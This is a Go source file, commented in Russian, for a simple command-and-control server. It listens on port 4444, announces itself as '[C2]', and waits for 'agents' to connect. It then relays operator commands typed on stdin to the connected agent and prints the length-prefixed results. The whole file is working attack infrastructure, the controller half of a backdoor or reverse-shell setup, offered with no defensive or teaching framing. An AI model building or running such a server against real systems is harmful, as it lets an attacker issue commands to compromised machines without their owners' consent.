package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"strings"
)

func main() {
	listener, err := net.Listen("tcp", "0.0.0.0:4444")
	if err != nil {
		fmt.Println("Ошибка запуска сервера:", err)
		return
	}
	defer listener.Close()
	fmt.Println("[C2] Сервер запущен на порту 4444. Ожидание агентов...")

	cmdChan := make(chan string)
	go func() {
		scanner := bufio.NewScanner(os.Stdin)
		fmt.Println("Введите команду для отправки агенту (или 'exit' для выхода):")
		for scanner.Scan() {
			cmd := scanner.Text()
			if cmd == "exit" {
				close(cmdChan)
				return
			}
			cmdChan <- cmd
		}
	}()

	conn, err := listener.Accept()
	if err != nil {
		fmt.Println("Ошибка принятия соединения:", err)
		return
	}
	defer conn.Close()
	fmt.Println("[+] Агент подключился")

	reader := bufio.NewReader(conn)
	firstLine, _ := reader.ReadString('\n')
	fmt.Printf("[+] Агент: %s\n", strings.TrimSpace(firstLine))

	for cmd := range cmdChan {
		// Отправляем команду (строку + \n)
		_, err := conn.Write([]byte(cmd + "\n"))
		if err != nil {
			fmt.Println("[-] Ошибка отправки команды:", err)
			break
		}

		// ---- НОВОЕ: читаем длину ответа (4 байта) ----
		lenBuf := make([]byte, 4)
		_, err = conn.Read(lenBuf)
		if err != nil {
			fmt.Println("[-] Ошибка чтения длины ответа:", err)
			break
		}
		length := uint32(lenBuf[0])<<24 | uint32(lenBuf[1])<<16 | uint32(lenBuf[2])<<8 | uint32(lenBuf[3])

		// Читаем ровно length байт
		data := make([]byte, length)
		_, err = conn.Read(data)
		if err != nil {
			fmt.Println("[-] Ошибка чтения данных ответа:", err)
			break
		}

		fmt.Print("[+] Результат:\n", string(data))
		fmt.Println("Введите следующую команду:")
	}
}
